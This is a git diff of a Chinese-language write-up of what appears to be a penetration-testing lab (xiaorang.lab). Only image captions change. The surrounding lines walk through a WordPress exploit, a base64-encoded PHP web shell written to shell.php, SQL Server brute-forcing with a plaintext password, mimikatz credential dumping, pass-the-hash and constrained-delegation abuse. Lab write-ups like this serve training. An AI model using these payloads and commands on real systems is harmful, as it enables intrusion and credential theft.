@@ -179,17 +179,17 @@ python3 WpCargo.py --help
 python3 WpCargo.py -t http://172.22.2.18/
 ```
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 写个木马上去链接一下`2=echo PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7Pz4=|base64 -d > /var/www/html/shell.php`
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
 拿到数据库账号密码，链一下
 
-![1](./assets/003.png)
+![image](./assets/003.png)
 
-![1](./assets/004.png)
+![image](./assets/004.png)
 
 发现flag2和密码，把**密码**导出来进行爆破，用户名不需要
 
@@ -197,7 +197,7 @@ python3 WpCargo.py -t http://172.22.2.18/
 
 接下来打**MSSQLSERVER.xiaorang.lab**，https://github.com/shack2/SNETCracker/releases 用工具进行爆破，我是win10直接用的exe就行
 
-![1](./assets/005.png)
+![image](./assets/005.png)
 
 ```
 172.22.2.16----SQLServer----1433----sa----ElGNkOiC
@@ -227,7 +227,7 @@ privilege::debug
 sekurlsa::logonpasswords
 ```
 
-![1](./assets/006.png)
+![image](./assets/006.png)
 
 拿到NTHash之后直接PTH攻击，懒得制作银票
 
@@ -237,7 +237,7 @@ sekurlsa::pth /user:MSSQLSERVER$ /domain:XIAORANG.LAB /ntlm:4f4be8211219a166ed7d
 net user /domain
 ```
 
-![1](./assets/007.gif)
+![image](./assets/007.gif)
 
 收集域内信息
 
@@ -248,7 +248,7 @@ SharpHound.exe -c all
 
 直接找到这个机器用户看到入站执行权限里面DC是他的受约束委派用户
 
-![1](./assets/008.png)
+![image](./assets/008.png)
 
 > In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the "admin" user.
 > 在以下示例中，*victim* 是为受约束委派配置的攻击者控制的帐户（即哈希值是已知的）。也就是说，*victim* 在其 msds-AllowedToDelegateTo 属性中设置了“HTTP/PRIMARY.testlab.local”服务主体名称 （SPN）。该命令首先为 *受害者* 用户请求 TGT，并执行 S4U2self/S4U2proxy 进程，将“admin”用户模拟到“HTTP/PRIMARY.testlab.local”SPN。替代名称“cifs”将替换到最终服务票证中，并将票证提交到当前登录会话。这使攻击者能够以“admin”用户身份访问 PRIMARY.testlab.local 的文件系统。
